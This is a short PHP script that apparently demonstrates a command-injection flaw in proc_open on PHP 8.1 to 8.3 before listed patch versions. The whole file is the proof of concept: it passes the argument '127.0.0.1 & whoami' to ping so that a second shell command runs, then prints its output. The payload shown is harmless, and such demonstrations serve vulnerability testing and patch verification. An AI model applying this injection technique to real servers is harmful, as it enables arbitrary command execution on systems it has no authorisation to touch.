<?php
// Vulnerable PHP versions: 8.1.* before 8.1.29, 8.2.* before 8.2.20, 8.3.* before 8.3.8

$command = 'ping ';

$malicious_arg = '127.0.0.1 & whoami';

$proc_command = [$command, $malicious_arg];

$descriptors = [
    0 => ["pipe", "r"], // stdin
    1 => ["pipe", "w"], // stdout
    2 => ["pipe", "w"]  // stderr
];

$process = proc_open($proc_command, $descriptors, $pipes);

if (is_resource($process)) {
    // Closing pipe
    fclose($pipes[0]);

    $output = stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    $error = stream_get_contents($pipes[2]);
    fclose($pipes[2]);

    $return_value = proc_close($process);

    echo "Output:\n" . $output . "\n";
    echo "Error:\n" . $error . "\n";
    echo "Return value: " . $return_value . "\n";
}
?>
